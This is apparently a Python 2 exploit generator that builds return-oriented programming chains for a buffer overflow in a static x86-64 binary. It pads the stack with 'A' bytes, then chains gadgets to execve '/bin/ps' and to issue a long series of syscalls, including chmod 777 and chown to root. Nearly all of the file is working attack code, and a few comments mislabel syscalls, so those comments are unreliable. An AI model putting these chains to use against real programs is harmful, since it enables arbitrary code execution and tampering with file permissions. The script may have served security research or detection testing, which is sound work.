#!/usr/bin/python
from struct import pack
import shell1
import shell2
import shell3
import shell4
import shell5
import shell6
import shell7

def do_ps(p):
	#/bin/ps
	p += pack("<Q", 0x0000000000435404) # pop rdx ; ret
	p += pack("<Q", 0x00000000006d68a0) # @ .data
	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += "/bin/psA" # /bin/psA
	p += pack("<Q", 0x00000000004150ab) # mov QWORD PTR [rdx],rax ; ret
	p += pack("<Q", 0x0000000000435404) # pop rdx ; ret
	p += pack("<Q", 0x00000000006d68a7) # @ .data + 7
	p += pack("<Q", 0x000000000042139f) # xor rax,rax ; ret
	p += pack("<Q", 0x00000000004150ab) # mov QWORD PTR [rdx],rax ; ret
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x00000000006d68a0) # @ .data
	p += pack("<Q", 0x000000000040c6b7) # pop rsi ; ret
	p += pack("<Q", 0x00000000006d68a7) # @ .data + 7
	p += pack("<Q", 0x0000000000435404) # pop rdx ; ret
	p += pack("<Q", 0x00000000006d68a7) # @ .data + 7
	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x000000000000003b) #  execve
	p += pack("<Q", 0x000000000040bf9a) # syscall

def do_base(p):


	p += pack("<Q", 0x0000000000435404) # pop rdx ; ret
	p += pack("<Q", 0x00000000006d68a0) # @ .data
	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += "abcdefgh" # abcdefgh file name
	p += pack("<Q", 0x00000000004150ab) # mov QWORD PTR [rdx],rax ; ret

	#call open
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x00000000006d68a0) # @ .data

	p += pack("<Q", 0x000000000040c6b7) # pop rsi ; ret
	p += pack("<Q", 0x0000000000000002) # flags 2 read and write
 
	p += pack("<Q", 0x0000000000435404) # pop rdx ; ret
	p += pack("<Q", 0x0000000000000070) # mode group has read write and exeute permission

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x0000000000000002) # 2 open
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

	#after open, fd is in rax, value 4

	#call openat
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x0000000000000004) # dfd

	p += pack("<Q", 0x000000000040c6b7) # pop rsi ; ret
	p += pack("<Q", 0x00000000006d68a8) # @ .data

	p += pack("<Q", 0x0000000000435404) # pop rdx ; ret
	p += pack("<Q", 0x0000000000000002) # flags 2 read and write

	p += pack("<Q", 0x0000000000438a24) # pop r10 ; ret
	p += pack("<Q", 0x0000000000000070) # mode

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x0000000000000101) # 257 openat
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret


	#call write

	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret #fd
	p += pack("<Q", 0x0000000000000004) # 4 fd

	p += pack("<Q", 0x0000000000435404) # pop rdx ; ret
	p += pack("<Q", 0x00000000006d68a8) # @ .data + 8
	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += "12345678" # 12345678
	p += pack("<Q", 0x00000000004150ab) # mov QWORD PTR [rdx],rax ; ret

	p += pack("<Q", 0x000000000040c6b7) # pop rsi ; ret
	p += pack("<Q", 0x00000000006d68a0) # @ .data + 8

	p += pack("<Q", 0x0000000000435404) # pop rdx ; ret
	p += pack("<Q", 0x0000000000000008) # number of bytes 8

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x0000000000000001) # 1 write
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret


	# call stat

	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x00000000006d68a0) # @ .data
	p += pack("<Q", 0x000000000040c6b7) # pop rsi ; ret
	p += pack("<Q", 0x00000000006d68a8) # @ .data + 8

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x0000000000000004) # 4 stat
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

	# call fstat
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x0000000000000001) # stdout

	p += pack("<Q", 0x000000000040c6b7) # pop rsi ; ret
	p += pack("<Q", 0x00000000006d68a8) # @ .data + 8

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x0000000000000005) # 5 fstat
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

	# call close
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x0000000000000009) # fd 9

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x0000000000000003) # 3 close
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

	# call brk 0xecc000 (identified normal value in trace)
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x0000000000fcc000) # some address

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x000000000000000c) # 12 brk
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

	# call brk again
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x0000000000fcc000) # some address

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x000000000000000c) # 12 brk
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret


	# call rt_sigaction
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x0000000000000004) # 4 signum

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x000000000000000d) # 14 rt_sigaction
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

	# call mmap (with invalid argument, cannot set r8 r9)

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x0000000000000009) # 9 mmap
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

	# call read

	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x0000000000000004) # 4 fd
	p += pack("<Q", 0x000000000040c6b7) # pop rsi ; ret
	p += pack("<Q", 0x00000000006d68a8) # @ .data + 8
	p += pack("<Q", 0x0000000000435404) # pop rdx ; ret
	p += pack("<Q", 0x0000000000000008) # size

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x0000000000000000) # 0 read
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

	# uname
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x00000000006d68a0) # @ .data

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x000000000000003f) # 63 uname
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

	# utime

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x0000000000000084) # 132 utime
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret


	# call chmod

	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x00000000006d68a0) # @ .data
	p += pack("<Q", 0x000000000040c6b7) # pop rsi ; ret
	p += pack("<Q", 0x0000000000000777) # 777 mode

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x000000000000005a) # 90 chmod
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

	# chown

	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x00000000006d68a0) # @ .data
	p += pack("<Q", 0x000000000040c6b7) # pop rsi ; ret
	p += pack("<Q", 0x0000000000000000) # 0
	p += pack("<Q", 0x0000000000435404) # pop rdx ; ret
	p += pack("<Q", 0x0000000000000000) # 0

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x000000000000005c) # 92 chown
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

	# unlink
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x00000000006d68a8) # @ .data + 8

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x0000000000000057) # 87 chown
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

#call getdents
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x0000000000000000) # 4
	p += pack("<Q", 0x000000000040c6b7) # pop rsi ; ret
	p += pack("<Q", 0x00000000006d68a0) # @ .data
	p += pack("<Q", 0x0000000000435404) # pop rdx ; ret
	p += pack("<Q", 0x0000000000000000) # 0

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x000000000000004e) # 78 getdents
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret



#call exit
	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x000000000000003c) # 60 exit
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x0000000000000000) # 0
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

	return p
	

def main():
	
	p= ''
	# Padding goes here
	p += "AAAAAAAA" * 5

	p = shell1.do_1(p)
	#p = shell2.do_2(p)
	#p = shell3.do_3(p)
	#p = shell4.do_4(p)
	#p = shell5.do_5(p)
	#p = shell6.do_6(p)
	#p = shell7.do_7(p)
	#p = do_base(p)

	while len(p) < 1001:
		p += "AAAAAAAA"
	print p



main()
